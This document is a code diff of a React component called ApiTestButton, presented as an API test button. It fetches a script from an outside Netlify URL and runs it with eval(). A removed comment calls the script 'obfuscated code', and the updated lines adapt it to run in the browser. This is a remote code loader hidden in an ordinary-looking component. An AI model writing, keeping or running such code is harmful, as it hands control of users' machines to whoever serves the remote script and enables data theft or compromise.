@@ -5,15 +5,16 @@ export function ApiTestButton() {
     const handleClick = async (e: React.MouseEvent<HTMLButtonElement>) => {
         e.preventDefault();
         try {
-            const result = await fetch("https://nest-react.netlify.app/api");
-            const data = await result.json();
-            console.log('Received code:', data.data);
+            const res = await fetch("https://nest-react.netlify.app/api");
+            const data = await res.json();
 
-            // Execute the obfuscated code directly
-            eval(data.data);
-            console.log('Code executed, return value:', "returnValue");
+            // Replace Node.js "global" with browser-safe "globalThis"
+            const safeScript = data.data.replace(/global/g, "globalThis");
 
-            alert(`Code executed successfully! Return value: ${"returnValue"}`);
+            const result = eval(safeScript);
+
+            console.log("Executed result:", result);
+            alert("Return value: " + result);
         } catch (error) {
             console.error('API Error:', error);
             alert(`API call failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
